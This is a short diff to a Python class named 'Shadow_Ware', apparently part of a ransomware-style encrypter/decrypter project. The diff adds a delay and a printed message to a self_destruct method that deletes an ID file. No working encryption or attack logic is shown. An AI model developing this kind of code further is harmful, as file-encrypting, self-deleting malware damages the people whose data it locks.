@@ -1,4 +1,4 @@
-import base64, os, hashlib, hmac
+import base64, os, hashlib, hmac, time
 
 """ Class for encrypter """
 class Shadow_Ware():
@@ -90,6 +90,8 @@ class Shadow_Ware():
              print("Failed to remove " + file + "because " + e)
 
   def self_destruct(self):
+    time.sleep(3)
+    print("Decrypter: Self Destructing")
     try:
       os.remove(os.path.abspath("ID.id"))
     except Exception as e:
